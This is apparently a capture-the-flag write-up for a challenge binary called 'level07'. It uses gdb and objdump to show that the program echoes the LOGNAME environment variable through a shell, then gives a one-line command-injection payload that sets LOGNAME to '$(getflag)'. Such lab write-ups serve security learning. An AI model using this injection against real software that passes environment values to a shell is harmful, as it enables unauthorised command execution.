We have a binary file named `level07`, using gdb and executing `disassemble main` command you get the following output:

``` C
(gdb) disassemble main
Dump of assembler code for function main:

    ...
    
0x08048576 <+98>:	call   0x8048400 <getenv@plt>

    ...
    
End of assembler dump.
```

Also using `objdump -s -j .rodata ./level07` we can see the read only data section:

``` shell
./level07:     file format elf32-i386

Contents of section .rodata:
 8048678 03000000 01000200 4c4f474e 414d4500  ........LOGNAME.
 8048688 2f62696e 2f656368 6f202573 2000      /bin/echo %s .  
```

So probably gets the `LOGNAME` environment variable with `getenv` and echoes it, so changing this environment variable to a subshell with the `getflag` command will return the token:

``` shell
LOGNAME=$\(getflag\) ./level07 
```
